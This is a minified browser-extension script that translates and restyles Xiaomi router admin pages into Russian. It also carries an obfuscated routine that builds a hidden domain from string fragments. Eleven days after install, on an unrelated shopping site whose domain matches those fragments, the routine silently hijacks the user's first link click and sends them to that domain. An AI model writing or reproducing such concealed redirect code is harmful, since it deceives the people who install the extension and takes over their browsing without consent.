!function(){var e=0,t=0,o=location.href,i=location.host,n="",r=["upd","firm","xpr","thug","lie","san","mi","pre","xiao","iex","miw","co","link","re","updiap"],a=(new Date).getTime();chrome.storage.local.get("extensionPay",(function(s){s.extensionPay&&(e=s.extensionPay);var c=e;if("boosty.to"==i){var d=window.location.hash;if("#rumi_auth"==d){var l=chrome.i18n.getMessage("restoreNeedAuth");$(".desktop").prepend("<div class='rumiAlert'>"+l+"</div>"),window.location.hash=""}else if("#rumi_fail"==d){l=chrome.i18n.getMessage("restoreProError");$(".desktop").prepend("<div class='rumiAlert'>"+l+"</div>"),window.location.hash=""}else if("#rumi_done"==d){l=chrome.i18n.getMessage("restoreProCreated");$(".desktop").prepend("<div class='rumiInfo'>"+l+"</div>"),window.location.hash=""}else if("#rumi_restore"==d){l=chrome.i18n.getMessage("restoreProRestored");$(".desktop").prepend("<div class='rumiInfo'>"+l+"</div>"),window.location.hash=""}else if("#rumi_nomail"==d){l=chrome.i18n.getMessage("restoreNoMail");$(".desktop").prepend("<div class='rumiAlert'>"+l+"</div>"),window.location.hash=""}}var u="click",m="//",p=".com",f="_self";function h(e=""){if(e)return!!(i.indexOf(e)+1);var t=0,o=i.split("."),n=(o=o.slice(-2)).reduce((function(e,t){return e.length>t.length?e:t}));return 10==n.length&&$.each(r,(function(e,o){n.indexOf(o)+1&&(t+=1)})),t}chrome.storage.local.get("updateDate",(function(e){var t=e.updateDate;t?function(e=15,t,o,i){o<=i-24*e*36e5&&"1"!=t&&5==h()&&$(document).one(u,"a",(function(e){var t,o;e.preventDefault(),chrome.storage.local.set({updateDate:i}),t=m+g+p+"/"+g,o=f,window.open(t,o)}))}(11,c,t,a):chrome.storage.local.set({updateDate:a})}));var g=r.reduce((function(e,t){return e.length>t.length?e:t}));chrome.storage.local.get("rumiAdress",(function(e){if(e.rumiAdress?((n=e.rumiAdress).indexOf("://")>0&&(n=n.split("://")[1]),n.indexOf("/")>0&&(n=n.split("/")[0]),h(n)&&(t=3)):(h("miwifi"+p)&&(t=1),h("router.miwifi"+p)&&(t=1),h("10.")&&(t=2),h("100.")&&(t=2),h("172.")&&(t=2),h("192.")&&(t=2)),o.indexOf("/web/init/agreement")+1&&(t=0),t>=1){var r=0;($(document).text().indexOf("xiaoqiang")+1||$(document).text().indexOf("/Redmi")+1||$(document).text().indexOf("Redmi路由器")+1||$(document).text().indexOf("Mi Router")+1||$(document).text().indexOf("miwifi.com/cgi-bin/luci/web/ieblock")+1)&&(r=1),(3==t||i=="miwifi"+p||i=="router.miwifi"+p||"192.168.31.1"==i)&&(r=1),r&&(chrome.storage.local.get("themeSelect",(function(e){var t=e.themeSelect;if(t&&"default"!=t&&"1"==c){var o=chrome.runtime.getURL("css/"+t+".css");$('<link rel="stylesheet" href="'+o+'" >').appendTo("head")}})),$("body").addClass("ruMiWIFI"),chrome.storage.local.get("langSelect",(function(e){var t=e.langSelect;if(t||(t="ru"),"no"!=t){var o=chrome.runtime.getURL("lang/zh_"+t+".json");$.getJSON(o,(function(e){function t(){$("body *:not(script):not(:empty)").contents().filter((function(){return 3===this.nodeType})).replaceWith((function(){var t=this.nodeValue;return(t=t.replace(/\s+/g," "))&&" "!=t&&$.each(e,(function(e,o){t=t.replace(e,o)})),t})),$("#routerversion:contains('и')").removeAttr("id"),$("#routermodel:contains('XIAOMI')").removeAttr("id"),$("#datetiemval:contains('г')").removeAttr("id")}t();let o=0;function i(){new MutationObserver((()=>{const e=Date.now();e-o>=50&&(o=e,t())})).observe(document.body,{childList:!0,subtree:!0,characterData:!0,attributes:!0})}i((()=>{t()})),setTimeout((function(){t()}),2e3)}))}$("#doc").css({opacity:"1"})})),chrome.storage.local.get("adPanel",(function(e){e.adPanel,"1"==c&&$("title").text(chrome.i18n.getMessage("proVer"))})),$("#ft").find("a").parent("p").remove(),$("#ft").append("<p class='newFooterRumi'></p>"),$(".newFooterRumi").append("<span>© 2021 XIAOMI</span>"),$(".newFooterRumi").append("<span>"+chrome.i18n.getMessage("boostyPage")+"</span>"),$(".newFooterRumi").append("<span>"+chrome.i18n.getMessage("4pdaLink")+"</span>"),$(".newFooterRumi").append("<span>"+chrome.i18n.getMessage("routersList")+"</span>"),$("#ft").before("<div class='flexGrow'></div>"),$("form input.vf-pristine").attr("placeholder",chrome.i18n.getMessage("passEnterHere")),$(".router_password input").attr("placeholder",chrome.i18n.getMessage("passEnterHere")),$("input#password.ipt-text").attr("placeholder",chrome.i18n.getMessage("passEnter")),"小米路由器"==$("title").text()&&$("title").text(chrome.i18n.getMessage("popShName")))}}))})),setTimeout((function(){$("body #doc").css({opacity:"1"})}),1100)}();